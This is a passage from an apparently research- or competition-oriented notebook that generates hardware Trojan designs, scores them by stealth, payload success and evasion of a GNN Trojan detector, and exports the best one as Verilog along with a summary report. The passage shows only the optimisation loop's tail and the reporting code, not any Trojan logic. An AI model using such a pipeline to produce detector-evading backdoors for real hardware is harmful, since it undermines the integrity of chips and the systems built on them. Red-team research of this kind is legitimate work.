                        "oracle_on_trigger":sc.get("oracle_on_trigger")})
        # stop early only on a fully-passing, detector-evading candidate
        if use_llm and sc["verdict"] == "ok" and sc.get("evades_detector") and sc["score"] >= 90:
            print("  target quality reached; stopping early."); break
    return results

results = feedback_loop()
best = max(results, key=lambda s: s["score"]) if results else None
print("\nBEST:", (best["name"], best["score"]) if best else None)

## 10 · Report & export

Writes the winning Trojan RTL, all scorecards, and a summary to
`submission/pipeline/pipeline_out/`.

In [ ]:
def _clean(sc):
    d = {k: v for k, v in sc.items() if k not in ("candidate",)}
    if "ast" in d: d["ast"] = {k: d["ast"][k] for k in ("elaborates","interface_ok","errors")}
    if isinstance(d.get("gnn"), dict):              # drop bulky per-node detail, keep the summary
        d["gnn"] = {k: d["gnn"].get(k) for k in
                    ("available","verdict","trojan_votes","model_count",
                     "max_prob_trojan","mean_prob_trojan","reason")}
    return d

def _gnnP(s):
    v = (s.get("gnn") or {}).get("max_prob_trojan")
    return f"{v:.3f}" if isinstance(v, (int, float)) else "n/a"

if best:
    (OUT_DIR/"best_trojan.v").write_text(best["candidate"]["rtl"])
    json.dump([_clean(s) for s in results], open(OUT_DIR/"scorecards.json","w"), indent=2)
    rows = ["| rank | name | score | stealth | payload | lutΔ | dffΔ | gnnP(troj) | evades | verdict |",
            "|---|---|---|---|---|---|---|---|---|---|"]
    for i, s in enumerate(sorted(results, key=lambda s:-s["score"]), 1):
        rows.append(f"| {i} | {s['name']} | {s['score']} | {s.get('stealth_rate')} | "
                    f"{s.get('payload_ok')} | {s.get('lut_delta')} | {s.get('dff_delta')} | "
                    f"{_gnnP(s)} | {s.get('evades_detector')} | {s['verdict']} |")
    _gstat = _GNN.get("status") if "_GNN" in globals() else None
    summary = ("# Trojan pipeline run\n\n"
               f"- generation: {'LLM' if (ENABLE_LLM and (HAVE_ANTHROPIC or HAVE_OPENAI)) else 'offline seed bank'}\n"
               f"- GNN detector gate: {_gstat or 'disabled'}"
               f" (margin {GNN_MARGIN}, weight {GNN_WEIGHT})\n"
               f"- candidates: {len(results)}  | best: **{best['name']}** (score {best['score']})\n"
               f"- base footprint: {BASE_FP['lut']} LUT4 / {BASE_FP['dff']} DFF\n\n"
               + "\n".join(rows) + "\n\n"
               f"## Best candidate\n- trigger: {best['candidate'].get('trigger_description')}\n"
               f"- payload: {best['candidate'].get('payload_description')}\n"
               f"- trigger outputs: {best.get('trigger_outputs')} "
               f"(oracle would give {best.get('oracle_on_trigger')})\n"
               f"- GNN: verdict={(best.get('gnn') or {}).get('verdict')} "
               f"votes={(best.get('gnn') or {}).get('trojan_votes')} "
               f"max_P(trojan)={_gnnP(best)} evades={best.get('evades_detector')}\n")
    (OUT_DIR/"RUN_SUMMARY.md").write_text(summary)
    print(summary)
    print("artifacts ->", OUT_DIR)
else:
    print("no candidates produced")